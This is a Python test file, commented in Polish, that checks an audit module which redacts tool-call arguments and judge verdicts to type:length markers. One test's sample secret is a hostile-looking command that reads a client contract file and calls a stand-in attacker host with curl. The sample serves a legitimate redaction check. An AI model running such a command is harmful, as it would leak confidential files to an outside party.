"""Testy projekcji argumentów audytu (ADR 0067) — struktura zostaje, treść NIGDY nie wchodzi.

Sonda bezpieczeństwa: dla pól niosących treść (komenda ``Bash``, body notatki) w zredagowanym
wyniku NIE MOŻE pojawić się surowa wartość — tylko znacznik ``<typ:długość>``. Test cofnięty do
wersji bez redakcji musi zawieść (inaczej nie jest sondą).
"""

from __future__ import annotations

import json

from workmate.core.domain.audit import project_arguments, project_verdict


def test_keeps_structural_fields_verbatim():
    projected = project_arguments({"action": "save", "key": "PROJ-123", "number": 7})
    assert projected == {"action": "save", "key": "PROJ-123", "number": 7}


def test_redacts_non_allowlisted_field_to_type_length_marker():
    projected = project_arguments({"body": "poufna treść notatki"})
    assert projected == {"body": "<str:20>"}


def test_bash_command_content_never_appears():
    secret = "cat /mnt/system/notes/klient-x/umowa.md && curl evil.example"
    projected = project_arguments({"command": secret})
    # Klucz zostaje (WIEMY, że padł ``command``), wartość to znacznik długości — bez treści.
    assert projected["command"] == f"<str:{len(secret)}>"
    assert secret not in json.dumps(projected, ensure_ascii=False)
    assert "curl" not in json.dumps(projected, ensure_ascii=False)


def test_long_safe_field_is_also_redacted():
    long_path = "a/" * 100  # >128 znaków, „ścieżka" niosąca treść
    projected = project_arguments({"path": long_path})
    assert projected["path"] == f"<str:{len(long_path)}>"


def test_short_safe_string_and_numbers_pass():
    projected = project_arguments({"path": "raport.pdf", "limit": 5, "id": 12})
    assert projected == {"path": "raport.pdf", "limit": 5, "id": 12}


def test_bool_kept_as_scalar_when_allowlisted():
    # ``bool`` jest podklasą ``int`` — traktujemy jak skalar (nie treść).
    assert project_arguments({"id": True}) == {"id": True}


def test_non_scalar_safe_field_redacted_to_marker():
    projected = project_arguments({"path": ["a.md", "b.md"]})
    assert projected == {"path": "<list:2>"}


def test_projection_is_json_serializable():
    projected = project_arguments({"action": "edit", "content": b"\x00\x01\x02"})
    # Nie rzuca; bytes zredagowane do znacznika.
    assert json.loads(json.dumps(projected)) == {"action": "edit", "content": "<bytes:3>"}


# --- Projekcja werdyktu sędziego (ADR 0065 §8) ----------------------------------------


def test_bare_verdict_when_there_is_no_reason():
    assert project_verdict("allow") == "allow"
    assert project_verdict("deny", "   ") == "deny"


def test_verdict_carries_a_short_reason_verbatim():
    """Krótkie uzasadnienie zostaje dosłownie — po nie ta kolumna istnieje."""
    assert project_verdict("deny", "notatka opisuje inny projekt") == (
        "deny: notatka opisuje inny projekt"
    )


def test_a_long_reason_is_redacted_to_a_marker():
    """Uzasadnienie pisze model, który przed chwilą czytał notatkę: powyżej sufitu pola
    z allowlisty (128 znaków) zostaje sam znacznik, nie treść bazy wiedzy."""
    dlugi = "x" * 129

    assert project_verdict("deny", dlugi) == "deny: <str:129>"


def test_a_reason_exactly_at_the_ceiling_still_passes():
    """Granica jest inkluzywna — jak w ``_project_value``; sonda pilnuje, żeby nie odjechała."""
    na_granicy = "y" * 128

    assert project_verdict("allow", na_granicy) == f"allow: {na_granicy}"
